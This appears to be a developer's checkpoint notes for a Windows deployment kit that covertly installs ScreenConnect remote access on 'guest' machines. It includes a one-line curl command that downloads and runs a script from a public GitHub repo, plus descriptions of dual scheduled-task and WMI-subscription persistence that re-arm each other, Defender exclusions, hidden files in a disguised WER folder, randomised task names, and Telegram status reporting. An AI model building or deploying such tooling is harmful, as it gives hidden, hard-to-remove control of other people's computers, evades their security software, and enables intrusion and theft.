# CHECKPOINT — 2026-08-02

## Flatten note
All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).

## Current deploy — "another level" build
- **own.cmd O16** (self-contained): fixes launcher detach — RUNNER was set inside the `if` block but
  referenced as `%RUNNER%` (parse-time expansion -> empty), producing `call "" _RUN` = the recurring
  `'""' is not recognized` console error and fake "Detached OK" (task action `cmd.exe /c  _RUN` ran nothing).
  Now `!RUNNER!` everywhere in the block + `wproof` launch-proof check: method A only reports success
  if the worker actually wrote its proof file. Embeds all 4 payloads as `::`-prefixed base64 blocks
  (`B64_MON`/`B64_SEC`/`B64_TGR`/`B64_LIB`), extracted by `:Extract` at worker start; curl-from-repo
  remains as fallback. One download, zero repo dependency at deploy time.
- **own_lib.ps1 L1** (NEW): per-host identity (hostname-hash seeded task-name pools, 8 names x 4 slots,
  MO jitter 2-5 min -> `identity.cfg`, idempotent), WMI watchdog install/ensure, campaign `state.json`.
- **own_mon.cmd M9**: identity-aware rearm of chain1 (schtasks x4) + chain2 (WMI `WucacheWatchdog`
  interval timer 180s, `root\subscription` __EventFilter/CommandLineEventConsumer/__FilterToConsumerBinding);
  killing one chain revives both on next tick. MSI fallback chain incl. GitHub `pkg.msi` + jsDelivr.
  state.json every tick; hourly compact digest HB; 30-min DOWN/FAIL rate limit; self-update staged.
- **own_secure.cmd S4**: identity-aware task-XML ACL, DisableMSI neutralize, Defender exclusions,
  wbem repository ACL, hidden attrs incl. identity.cfg/state.json/own_lib.ps1.
- **tg_report.ps1 T7**: identity-aware expected tasks (4 schtasks + WMI chain2 line), campaign state
  section, `-Mode compact` one-line digest (`SCD|host|prim=..|alt=..|foreign=N|tasks=x/5|msi=..|up=..|b=..|ts`).
- **pkg.msi** (NEW, 13.5 MB): ScreenConnect primary MSI mirrored in repo as fallback installer source.
  sha256 `ad5cb2859a917cdc8a68eeefb0caaf21b45e797af65075ba691357aa9ff7dae1`.
- Keep FPs: `5f6010579852e507` + `f861c8140d453427`.

## Preferred Guest command (self-contained)
```
curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o16" && call %TEMP%\own.cmd
```

## Persist (identity-driven; defaults shown)
- chain1: 4 x schtasks from identity.cfg pools — tick MO 2-5m, backup MO 3-5m, ONSTART, ONLOGON
- chain2: WMI subscription `WucacheWatchdog` (timer 180s) -> runs own_mon.cmd
- own_mon re-arms BOTH chains every tick; tg_report shows both chains' health

## After detach — wait ~90s then verify
```
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```
Expect Telegram @nobuddyrmmBot DEPLOY report + hourly SCD digest lines.

## Rebuild embeds after editing payloads
`build_embed.ps1` regenerates base64 blocks in own.cmd + syncs own.txt (needs normal PowerShell;
this machine's shell sandbox hangs on ps1 — use certutil -encode + manual marker splice instead).

## Key paths
| What | Path |
|------|------|
| Project root | `C:\Users\nobuddy\Desktop\Project\` |
| WorkDir | `%ProgramData%\Microsoft\Windows\WER\Temp\.wucache` |
| Public drop | https://github.com/xnobuddy/github-drop |

## Next
Re-run own.cmd on guests to arm identity persist + watchdog + get DEPLOY telegram;
hourly compact digests replace per-event noise; watch for `SCD|` lines.
